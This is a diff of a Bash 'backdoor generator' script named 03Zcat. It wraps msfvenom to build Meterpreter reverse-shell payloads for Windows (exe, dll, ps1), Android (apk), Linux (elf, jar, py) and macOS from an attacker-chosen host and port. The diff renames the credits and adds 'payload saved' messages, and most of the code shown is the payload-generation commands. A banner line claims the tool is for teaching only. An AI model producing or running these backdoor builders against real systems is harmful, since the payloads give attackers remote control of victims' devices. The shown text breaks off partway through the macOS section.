@@ -21,17 +21,17 @@ logo () {
     echo -e "\033[1;32m────────────────────────────▄▀▄─────▄▀▄
 ───────────────────────────▄█░░▀▀▀▀▀░░█▄
 ───────────────────────▄▄──█░░░░░░░░░░░█──▄▄
-──────────────────────█▄▄█─█░░▀░░┬░░▀░░█─█▄▄█ ☣️03Zcat
+──────────────────────█▄▄█─█░░▀░░┬░░▀░░█─█▄▄█ ☣️03Zcat 02/2021 
                                      backdoor generator
                                      By: GZaballa (Killerpop) https://www.greyhelmet.ml/  
                                      
 
                                      
       \033[1;31mThis tool is created for didactic purposes and not to commit a crime. 
-      Haxk.Ur does not take care of any malicious use of the tool. 
+      GreyHelmet SEC  does not take care of any malicious use of the tool. 
       We recommend the use in a controlled laboratory.       By Staff GreyHelmet SEC  
       
-      ";
+		${Purple}Payload has been saved in the folder ~/root/Desktop/payloads/";
 
 }
 
@@ -111,7 +111,8 @@ windowsexe () {
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > ~/Desktop/payloads/$file.exe 2>/dev/null
-        payload='windows/meterpreter/reverse_tcp' ;;
+        payload='windows/meterpreter/reverse_tcp' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
 
         2)
         target
@@ -119,7 +120,8 @@ windowsexe () {
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p windows/meterpreter/reverse_http LHOST=$ip LPORT=$port -f exe > ~/Desktop/payloads/$file.exe 2>/dev/null
-        payload='windows/meterpreter/reverse_http' ;;
+        payload='windows/meterpreter/reverse_http' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
 
         3)
         target
@@ -127,7 +129,8 @@ windowsexe () {
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST=$ip LPORT=$port -f exe > ~/Desktop/payloads/$file.exe 2>/dev/null
-        payload='windows/meterpreter/reverse_tcp_dns' ;;
+        payload='windows/meterpreter/reverse_tcp_dns' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
 
         4)
         target
@@ -135,7 +138,8 @@ windowsexe () {
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=$port -f exe > ~/Desktop/payloads/$file.exe 2>/dev/null
-        payload='windows/meterpreter/reverse_https' ;;
+        payload='windows/meterpreter/reverse_https' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
     
         5)
         target
@@ -143,7 +147,8 @@ windowsexe () {
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p windows/meterpreter/reverse_tcp_uuid LHOST=$ip LPORT=$port -f exe > ~/Desktop/payloads/$file.exe 2>/dev/null
-        payload='windows/meterpreter/reverse_tcp_uuid' ;;
+        payload='windows/meterpreter/reverse_tcp_uuid' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
 
         6)
         target
@@ -151,7 +156,8 @@ windowsexe () {
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p windows/meterpreter/reverse_winhttp LHOST=$ip LPORT=$port -f exe > ~/Desktop/payloads/$file.exe 2>/dev/null
-        payload='windows/meterpreter/reverse_winhttp' ;;
+        payload='windows/meterpreter/reverse_winhttp' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
     
         7)
         target
@@ -159,7 +165,8 @@ windowsexe () {
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p windows/meterpreter/reverse_winhttps LHOST=$ip LPORT=$port -f exe > ~/Desktop/payloads/$file.exe 2>/dev/null
-        payload='windows/meterpreter/reverse_winhttps' ;;
+        payload='windows/meterpreter/reverse_winhttps' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
     
         *)
         echo -e "${Cyan}[☣️03Zcat] ☣️☣️ ERROR ☣️☣️!" 
@@ -207,7 +214,8 @@ Windowsdll () {
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p windows/meterpreter/reverse_http LHOST=$ip LPORT=$port -f dll > ~/Desktop/payloads/$file.dll 2>/dev/null
-        payload='windows/meterpreter/reverse_http' ;;
+        payload='windows/meterpreter/reverse_http' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
 
         3)
         target
@@ -215,7 +223,8 @@ Windowsdll () {
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST=$ip LPORT=$port -f dll > ~/Desktop/payloads/$file.dll 2>/dev/null
-        payload='windows/meterpreter/reverse_tcp_dns' ;;
+        payload='windows/meterpreter/reverse_tcp_dns' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
 
         4)
         target
@@ -223,7 +232,8 @@ Windowsdll () {
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=$port -f dll > ~/Desktop/payloads/$file.dll 2>/dev/null
-        payload='windows/meterpreter/reverse_https' ;;
+        payload='windows/meterpreter/reverse_https' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
     
         5)
         target
@@ -231,7 +241,8 @@ Windowsdll () {
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p windows/meterpreter/reverse_tcp_uuid LHOST=$ip LPORT=$port -f dll > ~/Desktop/payloads/$file.dll 2>/dev/null
-        payload='windows/meterpreter/reverse_tcp_uuid' ;;
+        payload='windows/meterpreter/reverse_tcp_uuid' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
 
         6)
         target
@@ -239,7 +250,8 @@ Windowsdll () {
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p windows/meterpreter/reverse_winhttp LHOST=$ip LPORT=$port -f dll > ~/Desktop/payloads/$file.dll 2>/dev/null
-        payload='windows/meterpreter/reverse_winhttp' ;;
+        payload='windows/meterpreter/reverse_winhttp' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
     
         7)
         target
@@ -247,7 +259,8 @@ Windowsdll () {
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p windows/meterpreter/reverse_winhttps LHOST=$ip LPORT=$port -f dll > ~/Desktop/payloads/$file.dll 2>/dev/null
-        payload='windows/meterpreter/reverse_winhttps' ;;
+        payload='windows/meterpreter/reverse_winhttps' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
     
         *)
         echo -e "${Cyan}[☣️03Zcat] ☣️☣️ ERROR ☣️☣️!" 
@@ -295,7 +308,8 @@ Windowsps1 () {
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p windows/meterpreter/reverse_http LHOST=$ip LPORT=$port -f ps1 > ~/Desktop/payloads/$file.ps1 2>/dev/null
-        payload='windows/meterpreter/reverse_http' ;;
+        payload='windows/meterpreter/reverse_http' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
 
         3)
         target
@@ -303,7 +317,8 @@ Windowsps1 () {
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST=$ip LPORT=$port -f ps1 > ~/Desktop/payloads/$file.ps1 2>/dev/null
-        payload='windows/meterpreter/reverse_tcp_dns' ;;
+        payload='windows/meterpreter/reverse_tcp_dns' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
 
         4)
         target
@@ -311,7 +326,8 @@ Windowsps1 () {
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=$port -f ps1 > ~/Desktop/payloads/$file.ps1 2>/dev/null
-        payload='windows/meterpreter/reverse_https' ;;
+        payload='windows/meterpreter/reverse_https' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
     
         5)
         target
@@ -319,7 +335,8 @@ Windowsps1 () {
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p windows/meterpreter/reverse_tcp_uuid LHOST=$ip LPORT=$port -f ps1 > ~/Desktop/payloads/$file.ps1 2>/dev/null
-        payload='windows/meterpreter/reverse_tcp_uuid' ;;
+        payload='windows/meterpreter/reverse_tcp_uuid' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
 
         6)
         target
@@ -327,7 +344,8 @@ Windowsps1 () {
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p windows/meterpreter/reverse_winhttp LHOST=$ip LPORT=$port -f ps1 > ~/Desktop/payloads/$file.ps1 2>/dev/null
-        payload='windows/meterpreter/reverse_winhttp' ;;
+        payload='windows/meterpreter/reverse_winhttp' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
     
         7)
         target
@@ -335,7 +353,8 @@ Windowsps1 () {
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p windows/meterpreter/reverse_winhttps LHOST=$ip LPORT=$port -f ps1 > ~/Desktop/payloads/$file.ps1 2>/dev/null
-        payload='windows/meterpreter/reverse_winhttps' ;;
+        payload='windows/meterpreter/reverse_winhttps' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
     
         *)
         echo -e "${Cyan}[☣️03Zcat] ☣️☣️ ERROR ☣️☣️!" 
@@ -370,7 +389,8 @@ android () {
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R > ~/Desktop/payloads/$file.apk 2>/dev/null
-        payload='android/meterpreter/reverse_tcp' ;;
+        payload='android/meterpreter/reverse_tcp' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
 
         2)
         target
@@ -378,15 +398,17 @@ android () {
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p android/meterpreter/reverse_https LHOST=$ip LPORT=$port R > ~/Desktop/payloads/$file.apk 2>/dev/null
-        payload='android/meterpreter/reverse_https' ;;
+        payload='android/meterpreter/reverse_https' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
 	
 	3)
 	target
 	echo 
 	  echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
-	msfvenom -p android/meterpreter/reverse_http LHOST=$ip LPORT=$port R > ~/Desktop/payloads/$file.apk 2>/dev/null
-        payload='android/meterpreter/reverse_http' ;;
+		msfvenom -p android/meterpreter/reverse_http LHOST=$ip LPORT=$port R > ~/Desktop/payloads/$file.apk 2>/dev/null
+        payload='android/meterpreter/reverse_http' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
 
 	* )
         echo -e "${Cyan}[☣️03Zcat] ☣️☣️ ERROR ☣️☣️!"  
@@ -463,7 +485,8 @@ Linuxjava (){
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=$ip LPORT=$port -f jar > ~/Desktop/payloads/$file.jar 2>/dev/null
-        payload='linux/x86/meterpreter_reverse_tcp' ;;
+        payload='linux/x86/meterpreter_reverse_tcp' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
 
         2)
         target
@@ -471,7 +494,8 @@ Linuxjava (){
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p linux/x86/meterpreter_reverse_https LHOST=$ip LPORT=$port -f jar > ~/Desktop/payloads/$file.jar 2>/dev/null
-        payload='linux/x86/meterpreter_reverse_https' ;;
+        payload='linux/x86/meterpreter_reverse_https' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
 
         3)
         target
@@ -479,7 +503,8 @@ Linuxjava (){
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p linux/x86/meterpreter_reverse_http LHOST=$ip LPORT=$port -f jar > ~/Desktop/payloads/$file.jar 2>/dev/null
-        payload='linux/x86/meterpreter_reverse_http' ;;
+        payload='linux/x86/meterpreter_reverse_http' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
 
         4)
         target
@@ -487,7 +512,8 @@ Linuxjava (){
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p linux/x86/meterpreter/reverse_tcp_uuid LHOST=$ip LPORT=$port -f jar > ~/Desktop/payloads/$file.jar 2>/dev/null
-        payload='linux/x86/meterpreter/reverse_tcp_uuid' ;;
+        payload='linux/x86/meterpreter/reverse_tcp_uuid' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
         
         5)
         target
@@ -495,7 +521,8 @@ Linuxjava (){
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p linux/x86/meterpreter/reverse_ipv6_tcp LHOST=$ip LPORT=$port -f jar > ~/Desktop/payloads/$file.jar 2>/dev/null
-        payload='linux/x86/meterpreter/reverse_ipv6_tcp' ;;
+        payload='linux/x86/meterpreter/reverse_ipv6_tcp' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
         
         6)
         target
@@ -503,7 +530,8 @@ Linuxjava (){
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p linux/x86/meterpreter/reverse_nonx_tcp LHOST=$ip LPORT=$port -f jar > ~/Desktop/payloads/$file.jar 2>/dev/null
-        payload='linux/x86/meterpreter/reverse_nonx_tcp' ;;
+        payload='linux/x86/meterpreter/reverse_nonx_tcp' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
 
     
         * )
@@ -542,7 +570,8 @@ Linuxelf (){
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=$ip LPORT=$port -f elf > ~/Desktop/payloads/$file.elf 2>/dev/null
-        payload='linux/x86/meterpreter_reverse_tcp' ;;
+        payload='linux/x86/meterpreter_reverse_tcp' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
 
         2)
         target
@@ -550,7 +579,8 @@ Linuxelf (){
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p linux/x86/meterpreter_reverse_https LHOST=$ip LPORT=$port -f elf > ~/Desktop/payloads/$file.elf 2>/dev/null
-        payload='linux/x86/meterpreter_reverse_https' ;;
+        payload='linux/x86/meterpreter_reverse_https' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
 
         3)
         target
@@ -558,7 +588,8 @@ Linuxelf (){
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p linux/x86/meterpreter_reverse_http LHOST=$ip LPORT=$port -f elf > ~/Desktop/payloads/$file.elf 2>/dev/null
-        payload='linux/x86/meterpreter_reverse_http' ;;
+        payload='linux/x86/meterpreter_reverse_http' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
 
         4)
         target
@@ -566,7 +597,8 @@ Linuxelf (){
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p linux/x86/meterpreter/reverse_tcp_uuid LHOST=$ip LPORT=$port -f elf > ~/Desktop/payloads/$file.elf 2>/dev/null
-        payload='linux/x86/meterpreter/reverse_tcp_uuid' ;;
+        payload='linux/x86/meterpreter/reverse_tcp_uuid' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
         
         5)
         target
@@ -574,7 +606,8 @@ Linuxelf (){
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p linux/x86/meterpreter/reverse_ipv6_tcp LHOST=$ip LPORT=$port -f elf > ~/Desktop/payloads/$file.elf 2>/dev/null
-        payload='linux/x86/meterpreter/reverse_ipv6_tcp' ;;
+        payload='linux/x86/meterpreter/reverse_ipv6_tcp' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
         
         6)
         target
@@ -582,7 +615,8 @@ Linuxelf (){
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p linux/x86/meterpreter/reverse_nonx_tcp LHOST=$ip LPORT=$port -f elf > ~/Desktop/payloads/$file.elf 2>/dev/null
-        payload='linux/x86/meterpreter/reverse_nonx_tcp' ;;
+        payload='linux/x86/meterpreter/reverse_nonx_tcp' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
 
     
         * )
@@ -621,7 +655,8 @@ Linuxpy (){
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=$ip LPORT=$port -f py > ~/Desktop/payloads/$file.py 2>/dev/null
-        payload='linux/x86/meterpreter_reverse_tcp' ;;
+        payload='linux/x86/meterpreter_reverse_tcp' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
 
         2)
         target
@@ -629,7 +664,8 @@ Linuxpy (){
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p linux/x86/meterpreter_reverse_https LHOST=$ip LPORT=$port -f py > ~/Desktop/payloads/$file.py 2>/dev/null
-        payload='linux/x86/meterpreter_reverse_https' ;;
+        payload='linux/x86/meterpreter_reverse_https' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
 
         3)
         target
@@ -637,7 +673,8 @@ Linuxpy (){
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p linux/x86/meterpreter_reverse_http LHOST=$ip LPORT=$port -f py > ~/Desktop/payloads/$file.py 2>/dev/null
-        payload='linux/x86/meterpreter_reverse_http' ;;
+        payload='linux/x86/meterpreter_reverse_http' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
 
         4)
         target
@@ -645,7 +682,8 @@ Linuxpy (){
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p linux/x86/meterpreter/reverse_tcp_uuid LHOST=$ip LPORT=$port -f py > ~/Desktop/payloads/$file.py 2>/dev/null
-        payload='linux/x86/meterpreter/reverse_tcp_uuid' ;;
+        payload='linux/x86/meterpreter/reverse_tcp_uuid' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
         
         5)
         target
@@ -653,7 +691,8 @@ Linuxpy (){
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p linux/x86/meterpreter/reverse_ipv6_tcp LHOST=$ip LPORT=$port -f py > ~/Desktop/payloads/$file.py 2>/dev/null
-        payload='linux/x86/meterpreter/reverse_ipv6_tcp' ;;
+        payload='linux/x86/meterpreter/reverse_ipv6_tcp' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
         
         6)
         target
@@ -661,7 +700,8 @@ Linuxpy (){
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p linux/x86/meterpreter/reverse_nonx_tcp LHOST=$ip LPORT=$port -f py > ~/Desktop/payloads/$file.py 2>/dev/null
-        payload='linux/x86/meterpreter/reverse_nonx_tcp' ;;
+        payload='linux/x86/meterpreter/reverse_nonx_tcp' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
 
     
         * )
@@ -700,7 +740,8 @@ osx (){
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p osx/x86/meterpreter_reverse_tcp LHOST=$ip LPORT=$port -f macho > ~/Desktop/payloads/$file.macho 2>/dev/null
-        payload='osx/x86/meterpreter_reverse_tcp' ;;
+        payload='osx/x86/meterpreter_reverse_tcp' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
 
         2)
         target
@@ -708,7 +749,8 @@ osx (){
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p osx/x86/meterpreter_reverse_https LHOST=$ip LPORT=$port -f macho > ~/Desktop/payloads/$file.macho 2>/dev/null
-        payload='osx/x86/meterpreter_reverse_https' ;;
+        payload='osx/x86/meterpreter_reverse_https' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
 
         3)
         target
@@ -716,7 +758,8 @@ osx (){
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p osx/x86/meterpreter_reverse_http LHOST=$ip LPORT=$port -f macho > ~/Desktop/payloads/$file.macho 2>/dev/null
-        payload='osx/x86/meterpreter_reverse_http' ;;
+        payload='osx/x86/meterpreter_reverse_http' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
 
         4)
         target
@@ -724,7 +767,8 @@ osx (){
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p osx/x86/meterpreter/reverse_tcp_uuid LHOST=$ip LPORT=$port -f macho > ~/Desktop/payloads/$file.macho 2>/dev/null
-        payload='osx/x86/meterpreter/reverse_tcp_uuid' ;;
+        payload='osx/x86/meterpreter/reverse_tcp_uuid' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
         
         5)
         target
@@ -732,7 +776,8 @@ osx (){
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
